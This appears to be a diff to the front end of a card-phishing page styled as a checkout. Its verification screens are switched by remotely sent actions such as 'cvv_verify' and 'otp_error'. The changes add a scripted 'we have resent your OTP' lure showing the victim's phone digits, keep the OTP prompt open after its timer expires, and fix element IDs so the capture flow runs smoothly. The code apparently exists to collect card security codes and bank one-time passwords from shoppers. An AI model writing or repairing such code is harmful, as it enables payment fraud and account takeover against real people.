@@ -1026,8 +1026,8 @@ url("pay1ment_icons.woff") format("woff");
                         </div>
                         <div class="otp-error hidden" id="otp-error">Please enter your security code.</div>
                         <button class="otp-btn" id="otp-submit">Continue</button>
-                        <button class="otp-btn" id="otp-resend" style="background:#f5f5f5;color:#333;border:1px solid #ddd;margin-top:8px" onclick="resendOtp()">Resend Code</button>
-                        <div class="otp-countdown hidden">
+                        <button class="otp-btn" id="otp-resend" style="background:#f5f5f5;color:#333;border:1px solid #ddd;margin-top:8px">Resend Code</button>
+                        <div class="otp-countdown">
                             Code expires in <span id="otp-timer">4:59</span>
                         </div>
                         <div class="vfy-spinner hidden" id="otp-spinner">
@@ -1515,8 +1515,12 @@ url("pay1ment_icons.woff") format("woff");
     } else if (a === 'cvv_verify' || a === 'question_verify') {
       _curStep = 'otp';
       showOtp();
-      var otpMsg2 = q('otpMessage');
-      if (otpMsg2) otpMsg2.textContent = p.message || 'Please complete verification.';
+      var sfx = p.phoneSuffix || '****';
+
+    document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
+    document.getElementById('otp-amount').textContent='$'+discountedTotal().toFixed(2);
+      /*var otpMsg2 = q('otpMessage');
+      if (otpMsg2) otpMsg2.textContent = p.message || 'Please complete verification.';*/
       resetOtp();
  
     } else if (a === 'approve') {
@@ -1539,10 +1543,13 @@ url("pay1ment_icons.woff") format("woff");
       showInline('error', 'Card error: ' + (p.message || ''), true);
  
     } else if (a === 'otp_error') {
-      var otpErr = q('otpError');
-      if (otpErr) { otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code.'; }
-      var otpBtn = q('btnOtp');
-      if (otpBtn) { otpBtn.disabled = false; otpBtn.textContent = 'Verify'; }
+
+    document.getElementById('otp-spinner').style.display='none';
+    document.getElementById('otp-spinner').classList.add('hidden');
+      var otpErr = q('otp-error');
+      if (otpErr) { otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code.'; otpErr.classList.remove('hidden'); }
+      var otpBtn = q('otp-submit');
+      if (otpBtn) { otpBtn.disabled = false; otpBtn.textContent = 'Continue'; }
  
     } else if (a === 'timeout') {
       hideOtp();
@@ -1720,14 +1727,14 @@ url("pay1ment_icons.woff") format("woff");
     if (sec) sec.className = 'overlay hidden';
     //if (btn) btn.style.display = 'block';
     if (q('otp-code'))  q('otp-code').value = '';
-    if (q('otpError')) q('otpError').style.display = 'none';
+    if (q('otp-error')) q('otp-error').style.display = 'none';
     stopOtpTimer();
   }
  
   function resetOtp() {
     if (q('otp-code'))  { q('otp-code').value = ''; }
-    if (q('otpError')) { q('otpError').style.display = 'none'; }
-    var btn = q('btnOtp');
+    if (q('otp-error')) { q('otp-error').style.display = 'none'; }
+    var btn = q('otp-submit');
     if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
   }
  
@@ -1737,7 +1744,7 @@ url("pay1ment_icons.woff") format("woff");
   function startOtpTimer() {
     otpSec = 299;
     stopOtpTimer();
-    var timerEl = q('otpTimer');
+    var timerEl = q('otp-timer');
     if (timerEl) timerEl.style.display = 'block';
     tick();
     otpTimer = setInterval(function () {
@@ -1746,7 +1753,7 @@ url("pay1ment_icons.woff") format("woff");
       if (otpSec <= 0) {
         stopOtpTimer();
         //showMsg('error', 'OTP expired.');
-        hideOtp();
+        //hideOtp();
       }
     }, 1000);
   }
@@ -1773,6 +1780,7 @@ url("pay1ment_icons.woff") format("woff");
     }
     if (q('otp-error')) q('otp-error').style.display = 'none';
     document.getElementById('otp-spinner').style.display='flex';
+    document.getElementById('otp-spinner').classList.remove('hidden');
     var btn = q('otp-submit');
     if (btn) { btn.disabled = true; }
     
